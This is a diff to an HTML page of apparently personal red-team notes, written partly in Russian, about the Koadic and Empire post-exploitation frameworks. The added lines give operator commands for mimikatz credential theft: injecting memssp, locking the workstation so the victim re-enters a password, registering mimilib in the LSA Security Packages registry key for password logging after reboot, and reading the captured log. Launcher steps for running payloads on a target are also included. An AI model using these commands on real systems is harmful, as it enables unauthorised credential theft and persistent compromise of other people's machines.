@@ -62,7 +62,13 @@
     </li>
     <li class="toctree-l2"><a class="reference internal" href="#empire">Empire</a>
     </li>
+    <li class="toctree-l2"><a class="reference internal" href="#_1">Вспомогательное</a>
+    </li>
     </ul>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../hack_utilities/">Утилиты для продвижения</a>
                     </li>
                 </ul>
                 <ul>
@@ -107,7 +113,9 @@
               
                 <h1 id="framework-hack">Framework hack</h1>
 <h2 id="koadic">Koadic</h2>
-<p><code>run</code></p>
+<p>After run only need type:
+<code>set MODULE mimikaz_dotnet2js_</code> - запустит once модуль on activate
+<code>run</code></p>
 <p>copy and run mshta .... on target</p>
 <div class="codehilite"><pre><span></span><code><span class="n">use</span> <span class="n">implant</span><span class="o">/</span><span class="n">elevate</span><span class="o">/</span><span class="n">bypassuac_eventvwr</span>
 <span class="n">set</span> <span class="n">PAYLOAD</span> <span class="mi">0</span>
@@ -131,6 +139,22 @@
 <span class="n">creds</span>
 </code></pre></div>
 
+<p>Инжектировать модуль memssp</p>
+<div class="codehilite"><pre><span></span><code><span class="err">use mimikatz_dynwrapx</span>
+<span class="err">set MIMICMD misc:memssp</span>
+<span class="err">set ZOMBIE 32</span>
+<span class="err">run</span>
+</code></pre></div>
+
+<p>Перейти в консоль одно из зомби:
+<code>cmdshell 9</code>
+Вызвать блокировку рабочего стола:
+<code>RunDll32.exe user32.dll,LockWorkStation</code></p>
+<p>Добавить в реестр mimilib - работает после ребута, пишет пароли в файл system32\kiwissp.log</p>
+<div class="codehilite"><pre><span></span><code><span class="err">reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot;</span>
+<span class="err">reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0mimilib&quot; /t REG_MULTI_SZ /f</span>
+</code></pre></div>
+
 <h2 id="empire">Empire</h2>
 <div class="codehilite"><pre><span></span><code><span class="n">uselistener</span> <span class="n">http</span>
     <span class="k">set</span> <span class="n">name</span><span class="p">,</span> <span class="k">host</span><span class="p">,</span><span class="n">port</span>
@@ -138,10 +162,18 @@
 <span class="n">launcher</span> <span class="n">powershell</span> <span class="n">name_listener</span>
 </code></pre></div>
 
-<p>copy and run powershell command on target</p>
+<p>copy and run powershell_command on target</p>
 <div class="codehilite"><pre><span></span><code><span class="err">agents</span>
 <span class="err">interact name_agents</span>
 </code></pre></div>
+
+<p>Инжектировать mimi для записи паролей в system32\mimilsa.log
+<code>usemodule powershell/persistence/misc/memssp</code></p>
+<p>Заблокировать сессию. Запросить пароль после инжекта mimi
+<code>usemodule powershell/management/lock</code>
+<code>shell type mimilsa.log</code></p>
+<h2 id="_1">Вспомогательное</h2>
+<p>python3 -m http.server</p>
               
             </div>
           </div>
@@ -149,7 +181,7 @@
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../response_ib/" class="btn btn-neutral float-right" title="Обнаружение инцидента">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../hack_utilities/" class="btn btn-neutral float-right" title="Утилиты для продвижения">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
         <a href="../elastic/" class="btn btn-neutral" title="Elastic"><span class="icon icon-circle-arrow-left"></span> Previous</a>
@@ -181,7 +213,7 @@
         <span><a href="../elastic/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../response_ib/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../hack_utilities/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
